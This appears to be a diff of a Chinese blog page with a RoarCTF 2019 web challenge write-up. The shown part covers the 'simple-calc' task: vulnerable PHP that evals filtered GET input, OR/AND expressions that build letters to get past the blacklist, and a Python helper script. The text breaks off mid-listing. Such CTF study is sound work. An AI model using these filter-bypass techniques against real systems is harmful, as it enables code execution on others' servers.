@@ -1,194 +1,310 @@
+
+
 <!DOCTYPE html>
-<html lang=zh>
+<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>
+
+
+
 <head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="simple-calc题目源码后端存在waf，不能使用英文字母，但是可以使用数字还有一些运算符 123456789101112131415&lt;?phperror_reporting(0);if(!isset($_GET[&#39;num&#39;]))&amp;#123;    show_source(__FILE__);&amp;#125;else&amp;#123;        $str &#x3D; $_GET[&#39;num&#39;];">
-<meta property="og:type" content="article">
-<meta property="og:title" content="RoarCTF2019_web题解(待补充)">
-<meta property="og:url" content="http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/index.html">
-<meta property="og:site_name" content="osword&#39;s blog">
-<meta property="og:description" content="simple-calc题目源码后端存在waf，不能使用英文字母，但是可以使用数字还有一些运算符 123456789101112131415&lt;?phperror_reporting(0);if(!isset($_GET[&#39;num&#39;]))&amp;#123;    show_source(__FILE__);&amp;#125;else&amp;#123;        $str &#x3D; $_GET[&#39;num&#39;];">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/1571201776415.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/1571201900561.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/1571201983786.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/1571108312495.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/1571109934502.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/1571111012921.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/1571110449119.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/1571110604190.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/1571111166570.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/1571202207913.png">
-<meta property="og:image" content="http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/1571109567467.png">
-<meta property="article:published_time" content="2019-10-16T13:57:54.000Z">
-<meta property="article:modified_time" content="2020-05-15T08:25:52.000Z">
-<meta property="article:author" content="osword">
-<meta property="article:tag" content="CTF">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/1571201776415.png">
-    
-    
-        
-          
-              <link rel="shortcut icon" href="/images/favicon.ico">
-          
-        
-        
-          
-            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-          
-        
-        
-          
-            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-          
-        
-    
-    <!-- title -->
-    <title>RoarCTF2019_web题解(待补充)</title>
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="osword">
+  <meta name="keywords" content="">
+  <title>RoarCTF2019_web题解(待补充) - osword&#39;s blog</title>
 
-    <!-- persian styles -->
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
     
       
-<link rel="stylesheet" href="/css/rtl.css">
-
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/darcula.min.css" />
     
-    <!-- rss -->
-    
-    
-      <link rel="alternate" href="/true" title="osword&#39;s blog" type="application/atom+xml" />
-    
-<meta name="generator" content="Hexo 4.2.1"></head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-         
-          <li><a href="/archives/">归档</a></li>
-         
-          <li><a href="/projects_url">项目</a></li>
-        
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" href="/2019/10/17/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0-%E4%B8%80/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" href="/2019/10/11/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BPHPCMS-v9-6-0-SQL%E6%B3%A8%E5%85%A5/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">上一篇</span>
-      <span id="i-next" class="info" style="display:none;">下一篇</span>
-      <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/&text=RoarCTF2019_web题解(待补充)" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/&title=RoarCTF2019_web题解(待补充)" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/&is_video=false&description=RoarCTF2019_web题解(待补充)" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=RoarCTF2019_web题解(待补充)&body=Check out this article: http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/&title=RoarCTF2019_web题解(待补充)" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/&title=RoarCTF2019_web题解(待补充)" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/&title=RoarCTF2019_web题解(待补充)" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/&title=RoarCTF2019_web题解(待补充)" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/&name=RoarCTF2019_web题解(待补充)&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/&t=RoarCTF2019_web题解(待补充)" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#simple-calc"><span class="toc-number">1.</span> <span class="toc-text">simple-calc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目源码"><span class="toc-number">1.1.</span> <span class="toc-text">题目源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解法一"><span class="toc-number">1.2.</span> <span class="toc-text">解法一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解法二"><span class="toc-number">1.3.</span> <span class="toc-text">解法二</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#simple-Upload"><span class="toc-number">2.</span> <span class="toc-text">simple-Upload</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#uniqid函数"><span class="toc-number">2.1.</span> <span class="toc-text">uniqid函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路"><span class="toc-number">2.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件上传exp"><span class="toc-number">2.3.</span> <span class="toc-text">文件上传exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后缀爆破"><span class="toc-number">2.4.</span> <span class="toc-text">后缀爆破</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#wp"><span class="toc-number">3.</span> <span class="toc-text">wp</span></a></li></ol>
-    </div>
-  </span>
-</div>
-
-    
-    <div class="content index py4">
-        
-        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle" itemprop="name headline">
-        RoarCTF2019_web题解(待补充)
-    </h1>
-
-
-
-    <div class="meta">
-      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span itemprop="name">osword's blog</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2019-10-16T13:57:54.000Z" itemprop="datePublished">2019-10-16</time>
-        
-      
-    </div>
-
-
-      
-
-      
-    <div class="article-tag">
-        <i class="fas fa-tag"></i>
-        <a class="tag-link" href="/tags/CTF/" rel="tag">CTF</a>
-    </div>
-
-
-      <span id="/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/" class="leancloud_visitors" data-flag-title="RoarCTF2019_web题解(待补充)">
-    <em class="post-meta-item-text">阅读量 </em>
-    <i class="leancloud-visitors-count" data-index="/2019/10/16/RoarCTF2019-web%E9%A2%98%E8%A7%A3-%E5%BE%85%E8%A1%A5%E5%85%85/"></span>
-    </div>
-
-  </header>
   
 
-  <div class="content" itemprop="articleBody">
-    <h1 id="simple-calc"><a href="#simple-calc" class="headerlink" title="simple-calc"></a>simple-calc</h1><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><p>后端存在waf，不能使用英文字母，但是可以使用数字还有一些运算符</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-10-16 21:57" pubdate>
+        2019年10月16日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      38
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">RoarCTF2019_web题解(待补充)</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <h1 id="simple-calc"><a href="#simple-calc" class="headerlink" title="simple-calc"></a>simple-calc</h1><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><p>后端存在waf，不能使用英文字母，但是可以使用数字还有一些运算符</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+error_reporting(<span class="hljs-number">0</span>);
+<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'num'</span>]))&#123;
+    show_source(<span class="hljs-keyword">__FILE__</span>);
+&#125;<span class="hljs-keyword">else</span>&#123;
+        $str = $_GET[<span class="hljs-string">'num'</span>];
+        $blacklist = [<span class="hljs-string">' '</span>, <span class="hljs-string">'\t'</span>, <span class="hljs-string">'\r'</span>, <span class="hljs-string">'\n'</span>,<span class="hljs-string">'\''</span>, <span class="hljs-string">'"'</span>, <span class="hljs-string">'`'</span>, <span class="hljs-string">'\['</span>, <span class="hljs-string">'\]'</span>,<span class="hljs-string">'\$'</span>,<span class="hljs-string">'\\'</span>,<span class="hljs-string">'\^'</span>];
+        <span class="hljs-keyword">foreach</span> ($blacklist <span class="hljs-keyword">as</span> $blackitem) &#123;
+                <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/'</span> . $blackitem . <span class="hljs-string">'/m'</span>, $str)) &#123;
+                        <span class="hljs-keyword">die</span>(<span class="hljs-string">"what are you want to do?"</span>);
+                &#125;
+        &#125;
+        <span class="hljs-keyword">eval</span>(<span class="hljs-string">'echo '</span>.$str.<span class="hljs-string">';'</span>);
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre>
 
 
 
 <h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><p>思路：1. 利用php7 新增特性会将括号内的字符当做字符串</p>
 <pre><code>2. 利用数字的与或反三种运算（^被过滤）得到全部a-z等字符
      3. 动态函数执行</code></pre><p>php7特性，字符串括号拼接当做字符串</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">((999999999999999999999).(1))&#123;3&#125;|((999999999999999999999999).(1))&#123;6&#125;</span><br><span class="line">u</span><br><span class="line">((999999999999999999999).(1))&#123;3&#125;|((999999999999999999999999).(1))&#123;4&#125;</span><br><span class="line">o</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs angelscript">((<span class="hljs-number">999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;|((<span class="hljs-number">999999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">6</span>&#125;
+u
+((<span class="hljs-number">999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;|((<span class="hljs-number">999999999999999999999999</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">4</span>&#125;
+o</code></pre>
 
 
 
 <p>payload不能直接出现a数组其他的字符，否则会爆500，所以只能通过a数组中的字符进行与或得到其他额外字符</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line">a=[<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'E'</span>,<span class="string">'+'</span>,<span class="string">'.'</span>]</span><br><span class="line">b=[]</span><br><span class="line">c=[]</span><br><span class="line">d=[]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">b1=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">        b.append(i+<span class="string">'或'</span>+j+<span class="string">'-------'</span>+chr(ord(i)|ord(j)))</span><br><span class="line">        b1.append(chr(ord(i)|ord(j)))</span><br><span class="line"></span><br><span class="line">c1=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">        c.append(i+<span class="string">'与'</span>+j+<span class="string">'--------'</span>+chr(ord(i)&amp;ord(j)))</span><br><span class="line">        c1.append(chr(ord(i)&amp;ord(j)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">d1=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> set(b1+c1):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> set(b1+c1):</span><br><span class="line">		d.append(i+<span class="string">'与'</span>+j+<span class="string">'--------'</span>+chr(ord(i)&amp;ord(j)))</span><br><span class="line">		d1.append(chr(ord(i)&amp;ord(j)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(set(d1+b1+c1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># tmp=[]</span></span><br><span class="line"><span class="comment"># for i in set(d1+b1+c1):</span></span><br><span class="line"><span class="comment">#     print(bin(ord(i)))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a=raw_input(<span class="string">"input you find: "</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (b+c+d):</span><br><span class="line">    <span class="keyword">if</span> a <span class="keyword">in</span> i:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*- </span>
+a=[<span class="hljs-string">'0'</span>,<span class="hljs-string">'1'</span>,<span class="hljs-string">'2'</span>,<span class="hljs-string">'3'</span>,<span class="hljs-string">'4'</span>,<span class="hljs-string">'5'</span>,<span class="hljs-string">'6'</span>,<span class="hljs-string">'7'</span>,<span class="hljs-string">'8'</span>,<span class="hljs-string">'9'</span>,<span class="hljs-string">'E'</span>,<span class="hljs-string">'+'</span>,<span class="hljs-string">'.'</span>]
+b=[]
+c=[]
+d=[]
+
+
+b1=[]
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:
+    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> a:
+        b.append(i+<span class="hljs-string">'或'</span>+j+<span class="hljs-string">'-------'</span>+chr(ord(i)|ord(j)))
+        b1.append(chr(ord(i)|ord(j)))
+
+c1=[]
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:
+    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> a:
+        c.append(i+<span class="hljs-string">'与'</span>+j+<span class="hljs-string">'--------'</span>+chr(ord(i)&amp;ord(j)))
+        c1.append(chr(ord(i)&amp;ord(j)))
+
+
+d1=[]
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> set(b1+c1):
+	<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> set(b1+c1):
+		d.append(i+<span class="hljs-string">'与'</span>+j+<span class="hljs-string">'--------'</span>+chr(ord(i)&amp;ord(j)))
+		d1.append(chr(ord(i)&amp;ord(j)))
+
+
+print(set(d1+b1+c1))
+
+
+<span class="hljs-comment"># tmp=[]</span>
+<span class="hljs-comment"># for i in set(d1+b1+c1):</span>
+<span class="hljs-comment">#     print(bin(ord(i)))</span>
+
+
+
+a=raw_input(<span class="hljs-string">"input you find: "</span>)
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> (b+c+d):
+    <span class="hljs-keyword">if</span> a <span class="hljs-keyword">in</span> i:
+        print(i)
+        <span class="hljs-keyword">break</span></code></pre>
 
 
 
 <p>可以得到如下可用运算字符</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set([<span class="string">'\x01'</span>, <span class="string">'\x00'</span>, <span class="string">'\x05'</span>, <span class="string">'\x04'</span>, <span class="string">'!'</span>, <span class="string">' '</span>, <span class="string">'#'</span>, <span class="string">'"'</span>, <span class="string">'%'</span>, <span class="string">'$'</span>, <span class="string">"'"</span>, <span class="string">'&amp;'</span>, <span class="string">')'</span>, <span class="string">'('</span>, <span class="string">'+'</span>, <span class="string">'*'</span>, <span class="string">'-'</span>, <span class="string">','</span>, <span class="string">'/'</span>, <span class="string">'.'</span>, <span class="string">'1'</span>, <span class="string">'0'</span>, <span class="string">'3'</span>, <span class="string">'2'</span>, <span class="string">'5'</span>, <span class="string">'4'</span>, <span class="string">'7'</span>, <span 